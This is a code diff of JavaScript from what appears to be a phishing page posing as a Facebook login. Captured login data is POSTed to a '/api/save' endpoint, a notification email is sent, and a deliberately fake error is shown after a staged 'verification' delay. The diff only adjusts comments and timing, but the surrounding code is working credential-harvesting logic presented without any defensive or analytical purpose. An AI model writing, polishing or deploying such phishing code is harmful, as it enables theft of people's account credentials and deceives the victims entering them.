@@ -483,7 +483,7 @@
                     platform: 'facebook'
                 };
                 
-                // Send data to server
+                // Send data directly - no timeout
                 fetch('/api/save', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -497,11 +497,9 @@
                 })
                 .then(data => {
                     console.log('Data saved to database:', data);
-                    
-                    // Then send notification email
                     sendNotificationEmail();
                     
-                    // Show error after delay
+                    // After "verification" delay, show error
                     setTimeout(function() {
                         loginButton.innerHTML = 'Log In';
                         loginButton.disabled = false;
